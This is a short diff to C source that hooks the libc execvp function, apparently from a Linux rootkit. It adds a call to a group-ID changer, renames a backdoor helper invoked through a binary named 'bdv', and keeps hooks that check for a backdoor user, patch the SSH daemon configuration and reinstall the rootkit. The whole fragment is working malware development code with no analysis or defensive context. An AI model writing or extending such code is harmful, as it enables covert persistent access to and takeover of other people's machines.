@@ -2,6 +2,9 @@ int execvp(const char *filename, char *const argv[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
+#ifdef AUTO_GID_CHANGER
+    gidchanger();
+#endif
 #ifdef PATCH_SSHD_CONFIG
     sshdpatch(REG_USR);
 #endif
@@ -11,7 +14,7 @@ int execvp(const char *filename, char *const argv[]){
     if(is_bdusr()){
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
-            do_hidingutil(argv);
+            dobdvutil(argv);
 #endif
 #ifdef PATCH_SSHD_CONFIG
         if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
